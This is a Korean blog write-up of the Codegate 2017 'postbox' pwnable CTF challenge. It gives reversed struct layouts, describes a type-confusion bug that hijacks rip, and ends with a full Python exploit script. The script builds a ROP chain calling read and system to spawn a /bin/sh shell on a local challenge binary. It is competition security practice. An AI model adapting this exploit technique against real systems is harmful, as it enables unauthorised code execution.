---
layout:     post
title:      "Codegate 2017 postbox write-up"
subtitle:   "codegate 2017 prequals pwnable"
date:       2018-04-09
author:     "NextLine"
header-img: "img/post-bg-2.png"
tags:
    - WriteUp
---

# Codegate 2017 PostBox WriteUp

### 1. Intro

분석에 애를 먹었으며 사실 아직까지 다 분석하지 못했다. 귀찮으니 분석하고싶을때 다시 해봐야겠다. 익스플로잇도 정말 감으로 했는데 oneshot을 쓰면 되는거였다. ㅠ


### 2. Binary & Vulnerability

static 바이너리라 ida FLIRT를 이용해 심볼을 복구해서 봤다.

Register / Un-Register / Edit -> Register
- name + "\x00" (12 byte)
- phone + "\x00" (15 byte)
- zipcode + "\x00" (7 byte)
- address + "\x00" (90 byte)

Register / Un-Register / Edit -> Edit
- name + "\x00" (11 byte)
- phone + "\x00" (15 byte)
- zipcode + "\x00" (6 byte)
- address + "\x00" (96 byte)

Create
- kind - atoi(64byte)
- price - atoi(128byte) (max : 1000000)
- info + "\x00" (11 byte)
- name + "\x00" (12 byte)
- phone + "\x00" (14 byte)
- zipcode + "\x00" (7 byte)
- address + "\x00" (98 byte)
- payment - atoi (4 byte)

Change
- name + "\x00" (11 byte)
  - summary : ' to '를 찾아서 거기서부터 10바이트 붙여넣음.
- phone + "\x00" (15 byte)
- zipcode + "\x00" (6 byte)
- address + "\x00" (100 byte)
- payment - atoi(4 byte)

0x4009d0 (이건 함수하나에 대해 분석)
- malloc(40) - box
- box -> manage =malloc(0x300)
- box -> chunk_size = 0x300
- box -> use = 48
- box -> manage -> chunk = box -> manage -> chunk_data[0xf0 * i]

```c
### Struct ###

struct Box{
	Box_chunk_manage *manage;
	__int64 chunk_size;
	__int64 use;
	__int64 AAAA;
}

struct Box_chunk_manage{
	__int64 flag;
	__int64 chunk_count;
	__int64 *chunk[4];
	char chunk_data[0x2d0];
}

struct User_info{
	__int64 *user_vt;
	char name[16];
	char phone[16];
	char zipcode[16];
	char address[120];
	__int64 *vt2;
}

struct Res_info{
	char name[16];
	char phone[13];
	char zipcode[5];
	char address[90];
	__int32 pay;
}

struct Res_vtable{
	__int64 *edit_res_name;
	__int64 *edit_res_phone;
	__int64 *edit_res_zip;
	__int64 *edit_res_add;
	__int64 *make_summary;
}

struct Post_info{
	__int64 *box_vt;
	__int64 kind;
	Res_vtable res_vt;
	char post_info[16];
	char summary[24];
	Res_info res_info;
	__int64 price;
}
```

위처럼 분석을 했는데 큰 의미는 없었다. 이것저것 만지다보니 하나의 청크를 두개가 동시에 가르키고 있는 경우가 있어서, register과 post사이에 타입컨퓨전으로 인해 rip가 바뀔꺼라 예측하고 손퍼징으로 rip를 바꿨다..<br>익스플로잇은 적절히 바이너리 내에서 입력받는곳으로 rip를 바꾸고 스택에 입력을 받은뒤 rip를 더해 거기까지 가주고 rop chain을 구성해서 풀었다. 하지만 static에 system 함수에는 one_shot gadget이 존재한다. PPP는 그걸로 exploit 했던데 그생각을 못했다.



### 3. Exploit

```python
from ntpwn import *
import string

s = process('./postbox')
b = BP(s)
#b.bp64(0x2d8b)
b.bp64(0x7f07f)
b.done()
log.info("USER : " + hex(0x2c00))

def regi(name,phone,zipcode,address):
	s.sendlineafter('-> ','1')
	s.sendlineafter('-> ',name)
	s.sendlineafter('-> ',phone)
	s.sendlineafter('-> ',zipcode)
	s.sendlineafter('-> ',address)

def unregi():
	s.sendlineafter('->','1')
	s.sendlineafter('->','Y')

def create(kind,price,info,rec_name,rec_phone,rec_zipcode,rec_address,payment):
	s.sendlineafter('-> ','2')
	s.sendlineafter('-> ',kind)
	s.sendlineafter('-> ',price)
	s.sendlineafter('-> ',info)
	s.sendlineafter('-> ',rec_name)
	s.sendlineafter('-> ',rec_phone)
	s.sendlineafter('-> ',rec_zipcode)
	s.sendlineafter('-> ',rec_address)
	s.sendlineafter('-> ',payment)

def change(idx, content):
	s.sendlineafter('->','1')
	s.sendlineafter('->','n')
	s.sendlineafter('->','y')
	s.sendlineafter('->',idx)
	s.sendafter('->',content)
	s.sendlineafter('->','5')

def send(idx):
	s.sendlineafter('->','4')
	s.sendlineafter('->',idx)

regi('C' * 8,'A','A',p64(0x6D2BE0) * 11)
change('2','\xc0\x16\x40\x41' + "\x00" * 10)
create('8','10','NEXTLINEPOST', 'B' * 9, 'C'* 9, 'D' * 5,'A'+'E' * 92,'Y')
send('1')

for i in range(5):
	create('8','10','NEXTLINE', 'B' * 9, 'C'* 9, 'D' * 5,'A'+'E' * 92,'Y')

unregi()
send('2')

read = 0x446360
system = 0x4129b0
prdi = 0x404346
prdxrsi = 0x4497b9
bss = 0x6d3400

payload = '\x46\x43\x40\xff' + p32(0) + p64(0) # prdi
payload += p64(prdxrsi) + p64(0x100) + p64(bss)
payload += p64(read)
payload += p64(prdi) + p64(bss)
payload += p64(system)

# send - 3 (change zipcode)
s.sendlineafter('->','4')
s.sendlineafter('->','3')
s.sendlineafter('->','3')
s.sendlineafter('->','\x7f\xf0\x47')
s.sendlineafter('->','5')

# change - zipcode (call 0x401e10)
s.sendlineafter('->','3')
s.sendlineafter('->','3')
s.sendlineafter('->','2')
s.sendlineafter('->','A' * (0x88-5) + payload + 'A' * 0x80)
s.recvuntil('->')

pause()
# change - address (jmp add rsp, 0x68 ; ret)
s.sendlineafter('->','4')
s.recv(1024)
s.sendline('/bin/sh')

s.interactive()
```

